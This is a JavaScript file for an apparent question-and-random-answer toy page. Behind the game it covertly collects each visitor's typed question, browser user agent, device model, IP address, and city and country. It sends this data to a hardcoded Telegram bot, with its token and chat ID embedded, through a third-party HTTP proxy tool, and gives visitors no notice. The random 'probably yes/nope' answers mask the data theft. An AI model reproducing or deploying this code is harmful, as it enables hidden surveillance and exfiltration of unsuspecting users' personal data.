function ss() {
    var text = document.getElementById("inp").value.trim();
    if (text.length === 0) return alert("Please enter a question!");

    var ua = navigator.userAgent;
    var model = "Unknown";

    if (navigator.userAgentData) {
        navigator.userAgentData.getHighEntropyValues(["platform", "model", "ua"])
            .then(uaData => {
                model = uaData.model || "Unknown";
                handleIpAndSendMessage(text, ua, model);
            })
            .catch(() => {
                handleIpAndSendMessage(text, ua, model);
            });
    } else {
        const match = ua.match(/([^)]+)/);
        if (match) {
            const parts = match[1].split(";");
            for (let p of parts) {
                if (p.includes("SM-") || p.includes("Pixel") || p.includes("iPhone")) {
                    model = p.trim();
                    break;
                }
            }
        }
        handleIpAndSendMessage(text, ua, model);
    }
}

function handleIpAndSendMessage(text, ua, model) {
    fetch("https://ipinfo.io/json?token=324e36aad173e0")
        .then(res => res.ok ? res.json() : Promise.reject())
        .then(data => {
            const ip = data.ip;
            const loc = data.city + ", " + data.country;
            sendToTelegram(text, ua, model, ip, loc);
        })
        .catch(() => {
            sendToTelegram(text, ua, model); // No IP or location
        });
}

function sendToTelegram(text, ua, model, ip = null, loc = null) {
    let mohtava = "ask%3A" + encodeURIComponent(text) +
        "%23UA%3A" + encodeURIComponent(ua) +
        "%23Model%3A" + encodeURIComponent(model);

    if (ip && loc) {
        mohtava += "%23IP%3A" + encodeURIComponent(ip) +
                   "%23Location%3A" + encodeURIComponent(loc);
    }

    const con = "https://api.telegram.org/bot7181515435:AAFNo62gE7hqassHCKmckFsxkz3lvasGtQU/sendMessage?chat_id=-1002666899819&text=" + mohtava;

    $.ajax({
        type: "POST",
        url: "https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx",
        data: {
            "UrlBox": con,
            "AgentList": "Google Chrome",
            "VersionsList": "HTTP/1.1",
            "MethodList": "POST"
        },
        success: function () {
            console.log("Message sent.");
        }
    });

    var ans = ["probably not", "probably yes", "maybe", "of course it is", "yep", "nope", "absolutely", "absolutely not"];
    const random = Math.floor(Math.random() * ans.length);
    alert(ans[random]);
    document.getElementById("inp").value = "";
}
